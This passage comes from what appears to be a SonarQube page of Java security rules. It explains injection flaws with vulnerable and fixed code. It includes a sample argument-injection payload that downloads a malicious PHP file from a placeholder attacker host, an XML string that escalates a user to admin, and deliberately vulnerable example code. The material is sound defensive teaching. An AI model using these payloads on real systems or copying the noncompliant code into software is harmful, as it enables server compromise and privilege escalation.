protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  String location = req.getParameter("url");

  List&lt;String&gt; allowedHosts = new ArrayList&lt;String&gt;();
  allowedHosts.add("https://trusted1.example.com/");
  allowedHosts.add("https://trusted2.example.com/");

  if (allowedHosts.contains(location))
    resp.sendRedirect(location);
}
</pre>
<h3>How does this work?</h3>
<p>Built-in framework methods should be preferred as, more often than not, these provide additional security mechanisms. Usually, these built-in
methods are engineered for internal page redirections. Thus, they might not be the solution for the reader’s use case.</p>
<p>In case the application strictly requires external redirections based on user-controllable data, this could be done using the following
alternatives:</p>
<ol>
  <li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls). </li>
  <li> Using an allow-list approach in case the destination URLs are multiple but limited. </li>
  <li> Adding a customized page to which users are redirected, warning about the imminent action and requiring manual authorization to proceed. </li>
</ol>
<h3>Pitfalls</h3>
<h4>The trap of 'StartsWith' and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>
<p>If the validation string does not contain a terminating path separator, the Open Redirect vulnerability remains; only the exploitation technique
changes.</p>
<p>Thus, a validation like <code>startsWith("https://example.com")</code> or an equivalent with the regex <code>^https://example\.com.*</code> can be
exploited with the following URL <code>https://example.com.malicious.io</code>. The practice of taking over domains that maliciously look like
existing domains is widespread and is called <a href="https://en.wikipedia.org/wiki/Cybersquatting">Cybersquatting</a>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/601">CWE-601 - URL Redirection to Untrusted Site ('Open Redirect')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S2078">
              javasecurity:S2078
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>LDAP injections occur in an application when the application retrieves untrusted data and inserts it into an LDAP query without sanitizing it
first.</p>
<p>An LDAP injection can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s
response.<br> The absence of the corresponding response for the malicious request on the application is not a barrier to exploitation. Thus, it must
be treated the same way as basic LDAP injections.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to LDAP injection: after discovering the injection point, attackers insert data into the vulnerable
field to execute malicious LDAP commands.</p>
<p>The impact of this vulnerability depends on how vital LDAP servers are to the organization.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Data leakage or corruption</h4>
<p>In typical scenarios where systems perform innocuous LDAP operations to find users or create inventories, an LDAP injection could result in data
leakage or corruption.</p>
<h4>Privilege escalation</h4>
<p>A malicious LDAP query could allow an attacker to impersonate a low-privileged user or an administrator in scenarios where systems perform
authorization checks or authentication.</p>
<p>Attackers use this vulnerability to find multiple footholds on target organizations by gathering authentication bypasses.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to LDAP injections because untrusted data is concatenated to an LDAP query without prior sanitization
or validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public boolean authenticate(HttpServletRequest req, DirContext ctx) throws NamingException {
  String user = req.getParameter("user");
  String pass = req.getParameter("pass");

  String filter = "(&amp;(uid=" + user + ")(userPassword=" + pass + "))";

  NamingEnumeration&lt;SearchResult&gt; results = ctx.search("ou=system", filter, new SearchControls());
  return results.hasMore();
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public boolean authenticate(HttpServletRequest req, DirContext ctx) throws NamingException {
  String user = req.getParameter("user");
  String pass = req.getParameter("pass");

  String filter = "(&amp;(uid={0})(userPassword={1}))";

  NamingEnumeration&lt;SearchResult&gt; results = ctx.search("ou=system", filter, new String[]{user, pass}, new SearchControls());
  return results.hasMore();
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the
initially intended logic.</p>
<p>For LDAP injection, the cleanest way to do so is to use parameterized queries if it is available for your use case.</p>
<p>Another approach is to sanitize the input before using it in an LDAP query. Input sanitization should be primarily done using native libraries.</p>
<p>Alternatively, validation can be implemented using an allowlist approach by creating a list of authorized and secure strings you want the
application to use in a query. If a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Important note</strong>: The application must sanitize and validate on the server-side. Not on client-side front-ends.</p>
<p>The most fundamental security mechanism is the restriction of LDAP metacharacters.</p>
<p>For <strong>Distinguished Names</strong> (DN), special characters that need to be escaped include:</p>
<ul>
  <li> <code>\</code> </li>
  <li> <code>#</code> </li>
  <li> <code>+</code> </li>
  <li> <code>&lt;</code> </li>
  <li> <code>&gt;</code> </li>
  <li> <code>,</code> </li>
  <li> <code>;</code> </li>
  <li> <code>"</code> </li>
  <li> <code>=</code> </li>
</ul>
<p>For <strong>Search Filters</strong>, special characters that need to be escaped include:</p>
<ul>
  <li> <code>*</code> </li>
  <li> <code>(</code> </li>
  <li> <code>)</code> </li>
  <li> <code>\</code> </li>
  <li> <code>null</code> </li>
</ul>
<p>For Java, OWASP’s functions <a
href="https://www.javadoc.io/doc/org.owasp.esapi/esapi/latest/org/owasp/esapi/Encoder.html#encodeForDN-java.lang.String-"><code>encodeForDN</code></a>
and <a
href="https://www.javadoc.io/doc/org.owasp.esapi/esapi/latest/org/owasp/esapi/Encoder.html#encodeForLDAP-java.lang.String-"><code>encodeForLDAP</code></a>
allow sanitizing these characters and should be used: Remember that it is never a good practice to reinvent the wheel and write your own encoders.<br>
However, if it is not possible to use these libraries, <a
href="https://github.com/bcgit/bc-java/blob/r1rv74/prov/src/main/java/org/bouncycastle/jce/provider/X509LDAPCertStoreSpi.java#L52-L70">here</a> is an
example of an encoder implementation for LDAP search filters, in the <code>Bouncy Castle Java</code> framework.</p>
<p>In the compliant solution example, the <code>search</code> function allows to safely parameterize the query.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> <a href="https://www.ietf.org/rfc/rfc4514.txt">RFC 4514</a> - LDAP: String Representation of Distinguished Names </li>
  <li> <a href="https://www.ietf.org/rfc/rfc4515.txt">RFC 4515</a> - LDAP: String Representation of Search Filters </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/90">CWE-90 - Improper Neutralization of Special Elements used in an LDAP Query ('LDAP
  Injection')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S5883">
              javasecurity:S5883
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>OS command argument injections occur when applications allow the execution of operating system commands from untrusted data but the untrusted data
is limited to the arguments.<br> It is not possible to directly inject arbitrary commands that compromise the underlying operating system, but the
behavior of the executed command still might be influenced in a way that allows to expand access, for example, execution of arbitrary commands. The
security of the application depends on the behavior of the application that is executed.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting an arguments injection vulnerability will be able to add arbitrary argument to a system binary call. Depending on the
command the parameters are added to, this might lead to arbitrary command execution.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul>
  <li> download the internal server’s data, most likely to sell it </li>
  <li> modify data, send malware </li>
  <li> stop services or exhaust resources (with fork bombs for example) </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code uses the <code>find</code> command and expects the user to enter the name of a file to find on the system.</p>
<p>It is vulnerable to argument injection because untrusted data is inserted in the arguments of a process call without prior validation or
sanitization.<br> Here, the application ignores that a user-submitted parameter might contain special characters that will tamper with the expected
system command behavior.</p>
<p>In this particular case, an attacker might add arbitrary arguments to the <code>find</code> command for malicious purposes. For example, the
following payload will download malicious software on the application’s hosting server.</p>
<pre>
 -exec curl -o /var/www/html/ http://evil.example.org/malicious.php ;
</pre>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
@Controller
public class ExampleController
{
    @GetMapping(value = "/find")
    public void find(@RequestParam("filename") String filename) throws IOException {

        Runtime.getRuntime().exec("/usr/bin/find . -iname " + filename);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
@Controller
public class ExampleController
{
    @GetMapping(value = "/find")
    public void find(@RequestParam("filename") String filename) throws IOException {

        String cmd1[] = new String[] {"/usr/bin/find", ".", "-iname", filename};
        Process proc = Runtime.getRuntime().exec(cmd1); // Compliant
    }
}
</pre>
<p>java.lang.Runtime is sometimes used over java.lang.ProcessBuilder due to ease of use. Flexibility in methods often introduces security issues as
edge cases are easily missed. The compliant solution logic is also applied to java.lang.ProcessBuilder.</p>
<h3>How does this work?</h3>
<p>Allowing users to insert data in operating system commands generally creates more problems than it solves.</p>
<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br> Therefore, our suggestion is to avoid
using OS commands in the first place.</p>
<p>Here <code>java.lang.Runtime.exec(String[] cmdarray)</code> takes care of escaping the passed arguments and internally creates a single string
given to the operating system to be executed.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html">OWASP, OS Command Injection Defense
  Cheat Sheet</a> </li>
  <li> <a href="https://gtfobins.github.io/#+shell">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li>
  <li> <a href="https://lolbas-project.github.io/#">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/88">CWE-88 - Argument Injection or Modification</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S6399">
              javasecurity:S6399
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>XML injections occur when an application builds an XML-formatted string from user input without prior validation or sanitation. In such a case, a
tainted user-controlled value can tamper with the XML string content. Especially, unexpected arbitrary elements and attributes can be inserted in the
corresponding XML description.</p>
<p>A malicious injection payload could, for example:</p>
<ul>
  <li> Insert tags into the main XML document. </li>
  <li> Add attributes to an existing XML tag. </li>
  <li> Change the data value inside a tag. </li>
</ul>
<p>A malicious user-supplied value can perform other modifications depending on where and how the constructed data is later used.</p>
<h3>What is the potential impact?</h3>
<p>The consequences of an XML injection attack on an application vary greatly depending on the application’s logic. It can affect the application
itself or another element if the XML document is used for cross-component data exchange. For this reason, the actual impact can range from benign
information disclosure to critical remote code execution.</p>
<h4>Information disclosure</h4>
<p>An attacker can forge an attack payload that will modify the XML document so that it will become syntactically incorrect. In that case, when the
data is later used, the parsing component will raise a technical error. If displayed back to the attacker or made available through log files, this
technical error may disclose sensitive business or technical information.</p>
<p>This scenario, while in general the less severe one, is the most frequently encountered. It can combine with any other logic-dependant threat.</p>
<h4>Internal requests tampering</h4>
<p>Some applications communicate with backend micro-services APIs using XML-based protocols such as SOAP. When those applications are vulnerable to
XML injections, attackers can tamper with the internal requests' content. This will allow them to change internal requests' parameters or locations
which, in turn, can lead to various consequences like performing unauthorized actions or accessing sensitive data.</p>
<p>For example, altering a user creation request in such a way can lead to a privilege escalation if attackers manage to modify the default account
privilege level.</p>
<h4>Code execution</h4>
<p>An application might build objects based on an XML serialization string. In that case, an attacker that would exploit an XML injection could be
able to alter the serialization string to modify the corresponding object’s properties.</p>
<p>Depending on the deserialization process, this might allow instantiating arbitrary objects or objects with sensitive properties altered. This can
lead to arbitrary code being executed in the same way as a deserialization injection vulnerability.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code is an example of an overly simple authentication function: The role of a user is set in an XML file and the default user role is
<code>user</code>.<br> This example code is vulnerable to an XML injection vulnerability because it builds an XML string from user input without prior
sanitation or validation.</p>
<p>In this particular case, the query can be exploited with the following string:</p>
<pre>
attacker&lt;/username&gt;&lt;role&gt;admin&lt;/role&gt;&lt;/user&gt;
&lt;user&gt;&lt;username&gt;foo
</pre>
<p>By adapting and inserting this string into the <code>username</code> field, an attacker would be able to log in as an admin.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    String xml =
        """&lt;user&gt;
            &lt;username&gt;"""+req.getParameter("username")+"""&lt;/username&gt;
            &lt;role&gt;user&lt;/role&gt;
        &lt;/user&gt;""";

    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

    try {
        DocumentBuilder builder = factory.newDocumentBuilder();
        builder.parse(new InputSource(new StringReader(xml))); // Noncompliant
    } catch (ParserConfigurationException | SAXException e) {
        resp.sendError(400);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.Document;
import org.w3c.dom.Element;

protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {

    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

    try {
        DocumentBuilder builder = factory.newDocumentBuilder();
        Document doc = builder.newDocument();
        Element user = doc.createElement("user");
        doc.appendChild(user);

        Element usernameElement = doc.createElement("username");
        user.appendChild(usernameElement);
        username_element.setTextContent(req.getParameter("username"));

        Element role = doc.createElement("role");
        user.appendChild(role);
        role.setTextContent("user");

    } catch (ParserConfigurationException e) {
        resp.sendError(400);
    }
}
</pre>
<h3>How does this work?</h3>
<p>In most cases, building XML strings with a direct concatenation of user input is discouraged. While not always possible, a strong pattern-based
validation can help sanitize tainted inputs. Likewise, converting to a harmless type can sometimes be a solution.</p>
<p>However, directly constructing Java objects should be preferred over handling the properties of objects as strings.</p>
<h4>Programmatic object building</h4>
<p>In most cases, an application can directly create documents from user input without having to build and parse an XML string. Doing so prevents
injection vulnerabilities as XML document construction libraries and functions will properly escape and check the type of input values.</p>
<p>Sometimes, the application might need to include the user input in a document built from a trusted XML string. In that case, the recommended
solution is to parse the trusted string first and then programmatically modify the resulting document.</p>
<p>The example compliant code takes advantage of the <code>javax.xml</code> and <code>org.w3c.dom</code> libraries capabilities to programmatically
build XML documents.</p>
<h4>Converting to a harmless type</h4>
<p>When the application allows it, casting user-submitted data to a harmless type can help prevent XML injection vulnerabilities. In particular,
converting user inputs to numeric types is an efficient sanitation mechanism.</p>
<p>This mechanism can be extended to other types, including more complex ones. However, care should be taken when dealing with them, as manually
validating or sanitizing complex types can represent a challenge.</p>
<p>Note that choosing this solution can be error-prone: every user input has to be validated or sanitized without oversight.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/91">CWE-91 - XML Injection (aka Blind XPath Injection)</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S5145">
              javasecurity:S5145
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Log injection occurs when an application fails to sanitize untrusted data used for logging.</p>
<p>An attacker can forge log content to prevent an organization from being able to trace back malicious activities.</p>
<h3>What is the potential impact?</h3>
<p>If an attacker can insert arbitrary data into a log file, the integrity of the chain of events being recorded can be compromised.<br> This
frequently occurs because attackers can inject the log entry separator of the logger framework, commonly newlines, and thus insert artificial log
entries. <br> Other attacks could also occur requiring only field pollution, such as cross-site scripting (XSS) or code injection (for example,
Log4Shell) if the logged data is fed to other application components, which may interpret the injected data differently.<br></p>
<p>The focus of this rule is newline character replacement.</p>
<h4>Log Forge</h4>
<p>An attacker, able to create independent log entries by injecting log entry separators, inserts bogus data into a log file to conceal his malicious
activities. This obscures the content for an incident response team to trace the origin of the breach as the indicators of compromise (IoCs) lead to
fake application events.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to log injection as it constructs log entries using untrusted data. An attacker can leverage this to manipulate
the chain of events being recorded.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
private static final Logger logger = Logger.getLogger("Logger");

protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {

  String data = request.getParameter("data");
  if(data != null){
    logger.log(Level.INFO, "Data: {0} ", data);
  }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
private static final Logger logger = Logger.getLogger("Logger");

protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {

  String data = request.getParameter("data");
  if(data != null){
    data = data.replaceAll("[\n\r]", "_");
    logger.log(Level.INFO, "Data: {0} ", data);
  }
}
</pre>
<h3>How does this work?</h3>
<p>Data used for logging should be content-restricted and typed. This can be done by validating the data content or sanitizing it.<br> Validation and
sanitization mainly revolve around preventing carriage return (CR) and line feed (LF) characters. However, further actions could be required based on
the application context and the logged data usage.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/">Top 10 2021 Category A9 - Security Logging and
  Monitoring Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring">Top 10 2017 Category A10 -
  Insufficient Logging &amp; Monitoring</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/117">CWE-117 - Improper Output Neutralization for Logs</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S5167">
              javasecurity:S5167
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=java%3AS5122&rule_key=java%3AS5122'>S5122</a>, <a href='/organizations/sopra-steria/rules?open=java%3AS5146&rule_key=java%3AS5146'>S5146</a>, <a href='/organizations/sopra-steria/rules?open=java%3AS6287&rule_key=java%3AS6287'>S6287</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>User-provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Applications
constructing HTTP response headers based on tainted data could allow attackers to change security sensitive headers like Cross-Origin Resource Sharing
headers.</p>
<p>Web application frameworks and servers might also allow attackers to inject new line characters in headers to craft malformed HTTP response. In
this case the application would be vulnerable to a larger range of attacks like HTTP Response Splitting/Smuggling. Most of the time this type of
attack is mitigated by default modern web application frameworks but there might be rare cases where older versions are still vulnerable.</p>
<p>As a best practice, applications that use user-provided data to construct the response header should always validate the data first. Validation
should be based on a whitelist.</p>
<h3>Noncompliant code example</h3>
<pre>
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  String value = req.getParameter("value");
  resp.addHeader("X-Header", value); // Noncompliant
}
</pre>
<h3>Compliant solution</h3>
<pre>
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    String value = req.getParameter("value");

    String whitelist = "safevalue1 safevalue2";
    if (!whitelist.contains(value))
      throw new IOException();

    resp.addHeader("X-Header", value); // Compliant
}
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/index.php/HTTP_Response_Splitting">Attack Category - HTTP Response Splitting</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/113">CWE-113 - Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response
  Splitting')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S2076">
              javasecurity:S2076
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>OS command injections occur when applications build command lines from untrusted data before executing them with a system shell.<br> In that case,
an attacker can tamper with the command line construction and force the execution of unexpected commands. This can lead to the compromise of the
underlying operating system.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting an OS command injection vulnerability will be able to execute arbitrary commands on the underlying operating system.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul>
  <li> download the internal server’s data, most likely to sell it </li>
  <li> modify data, send malware </li>
  <li> stop services or exhaust resources (with fork bombs for example) </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it in Apache Commons</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to command injections because it is using untrusted inputs to set up a new process. Therefore an attacker can
execute an arbitrary program that is installed on the system.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
@Controller
public class ExampleController
{
    @GetMapping(value = "/exec")
    public void exec(@RequestParam("command") String command) throws IOException {

        CommandLine cmd = new CommandLine(command);
        DefaultExecutor executor = new DefaultExecutor();
        executor.execute(cmd);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
@Controller
public class ExampleController
{
    @GetMapping(value = "/exec")
    public void exec(@RequestParam("command") String command) throws IOException {

        List&lt;String&gt; allowedCmds = new ArrayList&lt;String&gt;();
        allowedCmds.add("/bin/ls");
        allowedCmds.add("/bin/cat");

        if (allowedCmds.contains(command)){
            CommandLine cmd = new CommandLine(command);
            DefaultExecutor executor = new DefaultExecutor();
            executor.execute(cmd);
        }
    }
}
</pre>
<h3>How does this work?</h3>
<p>Allowing users to execute operating system commands generally creates more problems than it solves.</p>
<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br> Therefore, our first suggestion is to
avoid using OS commands in the first place.<br> However, if the application requires running OS commands with user-controlled data, here are some
security suggestions.</p>
<h4>Pre-Approved commands</h4>
<p>If the application aims to execute only a small number of OS commands (for example, <code>ls</code>, <code>pwd</code>, and <code>grep</code>), the
cleanest way to avoid this problem is to validate the input before using it in an OS command.</p>
<p>Create a list of authorized and secure commands that you want the application to be able to execute. Use absolute paths to avoid any ambiguity.<br>
If a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p>Depending on the number of commands you want the application to support, the list can be either a regex string or any array type. If you use
regexes, choose simple regexes to avoid ReDOS attacks. For example, you can accept only a specific set of executables, by using
<code>^/bin/(ls|pwd|grep)$</code>.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<h4>Neutralize special characters</h4>
<p>If the application is to execute complex commands that cannot be controlled thanks to pre-approved lists, the cleanest approach is to use special
sanitization components, such as <code>org.apache.commons.exec.CommandLine.addArguments(String[] addArguments)</code>.</p>
<p>The library helps you to get rid of common dangerous characters, such as:</p>
<ul>
  <li> <code>&amp;</code> </li>
  <li> <code>|</code> </li>
  <li> <code>;</code> </li>
  <li> <code>$</code> </li>
  <li> <code>&gt;</code> </li>
  <li> <code>&lt;</code> </li>
  <li> <code>`</code> </li>
  <li> <code>\</code> </li>
  <li> <code>!</code> </li>
</ul>
<p>If user input is to be included in the arguments of a command, the application must ensure that dangerous options or argument delimiters are
neutralized.<br> Argument delimiters count <code>'</code>, <code>-</code> and spaces.</p>
<p>For example, the <code>find</code> command from UNIX supports the dangerous argument <code>-exec</code>.<br> In this case, option processing can be
terminated with a string containing <code>--</code> or with special options. For example, <code>git</code> supports <code>--end-of-options</code> <a
href="https://github.blog/2019-11-03-highlights-from-git-2-24/#tidbits">since its version 2.24</a>.</p>
<p>Here <code>org.apache.commons.exec.CommandLine.addArguments(String[] addArguments)</code> takes care of escaping the passed arguments and
internally creates a single string given to the operating system to be executed.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html">OWASP, OS Command Injection Defense
  Cheaty Sheet</a> </li>
  <li> <a href="https://gtfobins.github.io/#+shell">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li>
  <li> <a href="https://lolbas-project.github.io/#">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/78">CWE-78 - Improper Neutralization of Special Elements used in an OS Command</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S5147">
              javasecurity:S5147
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>NoSQL injections occur when an application retrieves untrusted data and inserts it into a database query without sanitizing it first.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application that is vulnerable to NoSQL injection:<br> After discovering the injection point, attackers insert data into
the vulnerable field to execute malicious commands in the affected databases.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Identity spoofing and data leakage</h4>
<p>In the context of simple query logic breakouts, a malicious database query enables privilege escalation or direct data leakage from one or more
databases.<br> This threat is the most widespread impact.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br> This threat is particularly insidious if the
attacked organization does not maintain a disaster recovery plan (DRP) as missing data can disrupt the regular operations of an organization.</p>
<h4>Chaining NoSQL injections with other vulnerabilities</h4>
<p>Attackers who exploit NoSQL injections rely on other vulnerabilities to maximize their profits.<br> Most of the time, organizations overlook some
defense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple
attacks with great impact:</p>
<ul>
  <li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li>
